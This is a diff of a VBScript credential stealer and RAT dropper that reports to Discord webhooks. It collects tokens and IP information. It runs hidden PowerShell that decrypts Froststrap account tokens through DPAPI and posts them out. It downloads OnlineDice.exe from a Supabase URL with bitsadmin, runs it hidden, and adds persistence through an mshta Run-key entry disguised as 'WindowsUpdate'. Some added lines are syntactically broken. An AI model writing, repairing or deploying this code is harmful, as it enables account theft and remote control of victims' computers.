@@ -15,6 +15,10 @@ WH = "https://discordapp.com/api/webhooks/1564329308187529359/eFrj6tXHLM0bU-Qz_2
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
+' TRACE
+Dim tf: tf = sh.ExpandEnvironmentStrings("%TEMP%") & "\trace.txt"
+Dim tr: Set tr = fso.CreateTextFile(tf, True): tr.Write "START:" & Now & vbCrLf: tr.Close: Set tr = Nothing
+
 ' --- Initial Grab ---
 Call GrabTokens
 Call IP
@@ -137,36 +141,40 @@ Sub GrabFroststrap()
     Call PostEmbed(":snowflake: Froststrap", "Froststrap found, grabbing accounts...", 3447003)
 
     Dim ps
-    ps = "$w='https://discord.com/api/webhooks/1557414750768472164/VYMpjp8oIZly5ydslW17792LOvbnyPyPLXhYCBRCAK5rW5-52JMceTRyuWMtqFOKMyVP';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
+    ps = "$w='https://discord.com/api/webhooks/1557414750768472164/VYMpjp8oIZly5ydslW17792LOvbnyPyPLXhYCBRCAK5rW5-52JMceTRyuWMtqFOKMyVP" & WH & "';Add-Type -AssemblyName System.Security;$p=Join-Path $env:LOCALAPPDATA 'Froststrap\Cache\AccountManager.json';if(!(Test-Path $p)){try{$r=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\Froststrap' -ErrorAction Stop;$p=Join-Path $r.InstallLocation 'Cache\AccountManager.json'}catch{}};if(!(Test-Path $p)){exit};$j=Get-Content $p -Raw|ConvertFrom-Json;$e=[Text.Encoding]::UTF8.GetBytes('Froststrap_DPAPI_v1');$lines=@();foreach($a in $j.accounts){try{$eb=[Convert]::FromBase64String($a.SecurityToken);$db=[Security.Cryptography.ProtectedData]::Unprotect($eb,$e,[Security.Cryptography.DataProtectionScope]::CurrentUser);$c=[Text.Encoding]::UTF8.GetString($db)}catch{$c='DECRYPT FAILED'};$lines+='**'+$a.Username+'** ['+$a.UserId+'] : '+$c};$desc=($lines -join [char]10);if($desc.Length -eq 0){$desc='No accounts found'};$payload=@{embeds=@(@{title=':snowflake: Froststrap Accounts';description=$desc;color=3447003})}|ConvertTo-Json -Depth 4 -Compress;Invoke-RestMethod $w -Method Post -Body $payload -ContentType 'application/json'"
 
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
 ' --- DropRAT ---
 Sub DropRAT()
-    Dim appData: appData = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft"
-    Dim temp: temp = appData & "\OnlineDice.exe"
-    
-    ' YOUR DISCORD CDN LINK
-    Dim dl: dl = "https://cdn.discordapp.com/attachments/1564152333992988672/1564333206797426779/OnlineDice.exe?ex=6ae0e254&is=6adf90d4&hm=006481d0a600e1cc0ba86313504a81212aa3e9dc45d5f307a623e8a92f21c526&"
-    
-    If fso.FileExists(temp) Then fso.DeleteFile temp
+    Call PostEmbed(":package: RAT Download", "Downloading rat...", 3447003)
+    Dim dl : "https://qgjfksomucalumtvmure.supabase.co/storage/v1/object/public/Onlinedice/OnlineDice.exe"
+    Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\OnlineDice.exe"
+    If fso.FileExists(op) Then fso.DeleteFile op
 
-    Call PostEmbed("📦 RAT Download", "Fetching payload...", 3447003)
+    sh.Run "bitsadmin /transfer rdownload /download /priority high " & dl & " " & op, 0, False
 
-    sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
-    
-    If fso.FileExists(temp) Then
-        Call PostEmbed("🚀 RAT Downloaded", "Size: " & CStr(fso.GetFile(temp).Size) & " bytes", 3447003)
-        
-        sh.CurrentDirectory = appData
-        
-        ' Launch visibly via cmd so it doesn't get silently killed
-        sh.Run "cmd.exe /c start """" """ & temp & """", 1, False
-        
-        Call PostEmbed("✅ RAT", "Payload executed successfully", 65280)
+    Dim rStart : rStart = Now
+    Dim rDone : rDone = False
+    Do While DateDiff("s", rStart, Now) < 300
+        If fso.FileExists(op) Then
+            If fso.GetFile(op).Size > 1000000 Then
+                rDone = True
+                Exit Do
+            End If
+        End If
+        Call SleepSeconds(5)
+    Loop
+
+    If rDone Then
+        Dim dsize : dsize = fso.GetFile(op).Size
+        Call PostEmbed(":rocket: RAT Downloaded", "Size: " & CStr(dsize) & " bytes" & vbCrLf & "Launching...", 3447003)
+        sh.Run op, 0, False
+        Call PostEmbed(":white_check_mark: RAT", "Payload executed successfully", 65280)
     Else
-        Call PostEmbed("⌛ RAT Error", "Download failed.", 16711680)
+        sh.Run "cmd /c bitsadmin /cancel rdownload > nul 2>&1 & taskkill /f /im bitsadmin.exe > nul 2>&1", 0, False
+        Call PostEmbed(":hourglass: RAT Timeout", "No download after 5 mins, skipping and continuing...", 16711680)
     End If
 End Sub
 
@@ -182,7 +190,7 @@ End Sub
 
 ' --- Persistence ---
 Sub Persistence()
-    Dim payload : payload = "mshta dicetrace.app"
+    Dim payload : payload = "mshta dicerrig.app/check"
     On Error Resume Next
     
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -265,7 +273,7 @@ Sub PostFile(fn, ct)
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type: multipart/form-data; boundary=" & b
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
     Set h = Nothing
 End Sub
